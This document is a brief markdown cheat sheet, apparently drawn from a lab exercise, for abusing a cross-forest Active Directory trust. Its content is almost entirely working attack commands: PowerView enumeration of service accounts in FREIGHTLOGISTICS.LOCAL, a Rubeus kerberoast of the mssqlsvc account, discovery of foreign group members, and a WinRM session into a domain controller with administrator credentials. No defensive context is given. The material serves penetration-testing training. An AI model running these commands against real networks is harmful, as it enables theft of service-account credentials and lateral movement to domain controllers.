# 🛠️ Cross-Forest Trust Abuse Tactical Field Manual (Windows Edition)

# ⚡ Phase 1 — Cross-Forest Kerberoasting

## 🔍 Enumerate Target Domain Accounts with SPNs
````powershell
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
`````

## 🕵️ Inspect Target Account Group Memberships
````powershell
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname, memberof
````

## 🚀 Execute Cross-Forest Kerberoasting via Rubeus
````powershell
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
````

---

# ⚡ Phase 2 — Foreign Group Membership & Lateral Movement

## 🔍 Enumerate Foreign Members inside Target Domain Groups
````powershell
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
````

## 🧠 Convert Discovered Foreign SID to Name Principal
````powershell
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
````

## 💀 Lateral Movement Over Trust via WinRM Session
````powershell
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
````
